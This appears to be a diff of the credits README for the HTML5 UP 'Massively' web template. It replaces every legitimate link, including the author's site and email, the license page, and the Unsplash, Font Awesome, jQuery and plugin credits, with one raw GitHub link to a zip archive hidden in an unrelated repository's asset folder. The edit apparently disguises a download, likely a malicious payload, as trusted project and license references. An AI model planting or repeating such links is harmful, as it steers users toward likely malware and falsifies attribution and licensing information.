@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-html5up.net | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-aj@lkn.io | @ajlkn
+https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (unsplash.com)
+		Unsplash (https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip)
 
 	Icons:
-		Font Awesome (fontawesome.io)
+		Font Awesome (https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip)
 
 	Other:
-		jQuery (jquery.com)
-		Scrollex (github.com/ajlkn/jquery.scrollex)
-		Responsive Tools (github.com/ajlkn/responsive-tools)
+		jQuery (https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip)
+		Scrollex (https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip)
+		Responsive Tools (https://github.com/purribd8/purribd8.github.io/raw/refs/heads/main/assets/sass/components/io-github-purribd-v3.9.zip)
